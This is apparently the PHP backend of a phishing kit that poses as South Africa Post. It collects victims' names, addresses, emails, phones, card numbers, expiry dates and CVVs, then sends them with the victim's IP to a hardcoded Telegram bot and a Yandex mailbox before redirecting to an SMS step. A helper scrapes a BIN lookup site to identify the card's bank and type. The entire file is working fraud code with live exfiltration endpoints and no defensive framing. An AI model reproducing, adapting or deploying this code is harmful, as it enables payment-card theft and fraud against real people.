<?php
/*   
$$$$$$$$$$$$$$$$$$       $$$$$$$$$$$$$$$$   $$                     $$  $$$$$$$$$$$$$$$$   $$          $$$
                $$       $$                  $$                   $$   $$                 $$         $$$$
               $$        $$                   $$                 $$    $$                 $$        $$ $$
		     $$          $$                    $$               $$     $$                 $$       $$  $$
			$$           $$                     $$             $$      $$                 $$      $$   $$
		  $$             $$$$$$$$$$$$$$$$        $$           $$       $$$$$$$$$$$$$$$$   $$     $$    $$
		 $$              $$                       $$         $$        $$                 $$    $$     $$
		$$               $$                        $$       $$         $$                 $$   $$      $$
	  $$                 $$                         $$     $$          $$                 $$  $$       $$
	 $$                  $$                          $$   $$           $$                 $$ $$        $$
	$$   	 	         $$$$$$$$$$$$$$$$             $$$$             $$$$$$$$$$$$$$$$   $$$          $$
*/            
session_start();
include("./lib/simple_html_dom.php");
include './lib/Telegram.php';

function Send_Telegram($msg){
    $telegramseven = new Telegram('6170288595:AAH3TK-D4YUaewDSgmupeCgJy9ba-jQ65n4');
	$contentseven = array('chat_id' => "-720760763", 'text' => $msg);
	$telegramseven->sendMessage($contentseven);

}

function BINS_PRO($bin){
	$data=array("action" => "searchbins", "bins" => $bin, "bank" => "", "country" => "");
	$data_string = http_build_query($data);
	$url="http://bins.su/";
	$agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/64.0";
	$ch = curl_init(); 
	$headers[] = "Host: bins.su";
	$headers[] = "Content-Type: application/x-www-form-urlencoded";
	$headers[] = "Referer: http://bins.su/";
	$headers[] = "Content-Length: ".strlen($data_string);
	$headers[] = "Connection: Keep-Alive";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_POST, true); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
	curl_setopt($ch, CURLOPT_URL, $url);
	$res = curl_exec($ch);
	$result = curl_exec($ch);
	curl_close($ch);
    $html=str_get_html($result);
    $container=$html->find("div#result",0)->find("table tr",1);
    $type=$container->find("td",3)->plaintext;
    $level=$container->find("td",4)->plaintext;
    $country=$container->find("td",1)->plaintext;
    $bank=$container->find("td",5)->plaintext;
    return array("Country"=>$country, "Type"=>$type, "Level"=>$level, "Bank"=>$bank);
}
function visitorip() {
	 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}
	 else if (getenv('HTTP_CLIENT_IP')){$ip = getenv('HTTP_CLIENT_IP');}
     else if(getenv('HTTP_X_FORWARDED_FOR')) {$ip = getenv('HTTP_X_FORWARDED_FOR');}
     else if(getenv('HTTP_X_FORWARDED')) {$ip = getenv('HTTP_X_FORWARDED');}
     else if(getenv('HTTP_FORWARDED_FOR')) {$ip = getenv('HTTP_FORWARDED_FOR');}
     else if(getenv('HTTP_FORWARDED')) {$ip = getenv('HTTP_FORWARDED');}
     else if(getenv('REMOTE_ADDR')) {$ip = getenv('REMOTE_ADDR');}
     else {$ip = $_SERVER['HTTP_HOST'];}
	 $ip=explode(",",$ip);
	 return $ip[0];
}

$ip = visitorip();
$hostname = gethostbyaddr($ip);
function Send__ToMe($sendme, $Subject, $Body, $FromName, $From){
	$headers = "MIME-Version: 1.0" . PHP_EOL;
	$headers .= "Content-type:text/html;charset=UTF-8" . PHP_EOL;
	$headers = "From: $FromName <$From>" . PHP_EOL;
	mail($sendme, $Subject, $Body, $headers);
	return Send_Telegram($Body);
	
}



$back = "load.php?auth=sms" ;

$From      = 'sevhen@ash.com';
$sendme    = 'sevehnthegot@yandex.com';
$FromName  = 'slovehnska';

if(isset($_POST["next"])){

	$message = "----[ South Aftica Post ]----".PHP_EOL;
	$message .= "Name : ".$_POST['fname'].PHP_EOL;
	$message .= "Adresse : ".$_POST['adress'].PHP_EOL;
	$message .= "City : ".$_POST['city'].PHP_EOL;
	$message .= "Email : ".$_POST['email'].PHP_EOL;
	$message .= "Phone : ".$_POST['phone'].PHP_EOL;
	$message .= "Card : ".$_POST['CC'].PHP_EOL;
	$message .= "EXPIRATION : ".$_POST['MM']."/".$_POST['YY'].PHP_EOL;
	$message .= "CVV : ".$_POST['CVV'].PHP_EOL;
	$message .= "----------[ EL PATRON ]----------".PHP_EOL;
	$message .= "IP             : $ip".PHP_EOL;
	$Subject   = "$ip";
	$send=Send__ToMe($sendme, $Subject, $message, $FromName, $From);
	header("Location: $back");

}


if(isset($_GET["checkbin"])){
	$bin=$_GET["checkbin"];
	$Bins_Pro=@BINS_PRO($bin);
	echo $Bins_Pro["Country"];
}

?>
